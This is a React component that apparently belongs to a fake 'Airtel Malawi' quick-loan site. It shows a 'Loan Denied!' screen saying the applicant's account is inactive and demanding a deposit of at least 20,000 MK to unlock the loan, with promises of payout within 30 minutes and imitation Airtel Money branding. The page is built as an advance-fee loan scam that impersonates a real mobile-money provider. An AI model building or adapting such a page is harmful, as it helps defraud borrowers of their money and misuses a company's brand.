import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';

function AirtelDenied() {
  const navigate = useNavigate();
  const [loanAmount, setLoanAmount] = useState('0');
  const REQUIRED_DEPOSIT = 20000; // 20,000 MK

  useEffect(() => {
    const savedAmount = localStorage.getItem('airtelLoanAmount');
    if (savedAmount) setLoanAmount(Number(savedAmount).toLocaleString('en-US'));
  }, []);

  const handleClearAndNavigate = () => {
    localStorage.clear();
    navigate('/');
  };

  return (
    <div className="page-wrapper">
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #DA1C1C; }
        .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; background-color: #DA1C1C; align-items: center; position: relative; }
        .header-top { width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: center; position: relative; color: #1a1a1a; }
        .header-title { font-size: 22px; font-weight: 900; }
        .header-sub { color: #1a1a1a; font-size: 12px; text-align: center; margin-bottom: 24px; font-weight: 500; }
        
        .card { background: #fff; width: 92%; max-width: 420px; border-radius: 24px; padding: 32px 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-bottom: 24px; z-index: 10; display: flex; flex-direction: column; align-items: center; }
        
        .icon-wrapper { width: 64px; height: 64px; border-radius: 50%; border: 3px solid #DA1C1C; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; color: #DA1C1C; font-size: 32px; font-weight: 900; }
        
        .card-title { font-size: 24px; font-weight: 900; color: #1a1a1a; margin-bottom: 8px; text-align: center; }
        .card-sub { font-size: 14px; color: #6B7280; margin-bottom: 24px; text-align: center; }
        
        .alert-box { background: #FEF2F2; border: 1px solid #FECACA; border-radius: 12px; padding: 20px; width: 100%; margin-bottom: 24px; text-align: center; }
        .alert-header { display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; font-size: 15px; }
        .alert-icon { color: #DA1C1C; font-size: 18px; }
        .alert-text { font-size: 13px; color: #4B5563; line-height: 1.5; margin-bottom: 8px; }
        .amount-highlight { font-size: 32px; font-weight: 900; color: #16A34A; margin-bottom: 8px; }
        
        .checklist-box { background: #FEF2F2; border: 1px solid #FECACA; border-radius: 12px; padding: 16px; width: 100%; margin-bottom: 24px; text-align: left; }
        .check-item { display: flex; align-items: flex-start; gap: 8px; font-size: 13px; color: #1a1a1a; margin-bottom: 8px; font-weight: 600; }
        .check-item:last-child { margin-bottom: 0; }
        .check-mark { color: #1a1a1a; font-weight: 900; }
        
        .btn { width: 100%; padding: 16px; border-radius: 8px; border: none; font-size: 16px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: 0.2s; background: #F87171; color: #1a1a1a; }
        .btn:active { background: #EF4444; }
        
        .bottom-brands { display: flex; gap: 16px; margin-top: auto; padding-bottom: 32px; }
        .brand-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
      `}</style>

      <div className="header-top">
        <h1 className="header-title">Airtel Malawi</h1>
      </div>
      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>

      <div className="card">
        <div className="icon-wrapper">!</div>
        
        <h2 className="card-title">Loan Denied!</h2>
        <p className="card-sub">Your loan has been denied.</p>

        <div className="alert-box">
          <div className="alert-header">
            <svg className="alert-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg>
            Airtel inactive
          </div>
          <p className="alert-text">Please deposit at least</p>
          <p className="amount-highlight">{REQUIRED_DEPOSIT.toLocaleString()} MK</p>
          <p className="alert-text">into your Airtel account to activate it and make a new request.</p>
        </div>

        <div className="checklist-box">
          <div className="check-item">
            <span className="check-mark">✔</span> Funds will be transferred to your account within 30 minutes.
          </div>
          <div className="check-item">
            <span className="check-mark">✔</span> Loan repayment period: 12 months
          </div>
        </div>

        <button className="btn" onClick={handleClearAndNavigate}>
          Go to dashboard →
        </button>
      </div>

      <div className="bottom-brands">
        <div className="brand-icon" style={{background: '#fff', borderRadius: '8px', border: '2px solid #ccc', color: '#DA1C1C', fontWeight: 'bold', fontSize: '10px'}}>D-<br/>Money</div>
        <div className="brand-icon" style={{color: '#1E293B'}}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
        </div>
        <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
      </div>
    </div>
  );
}

export default AirtelDenied;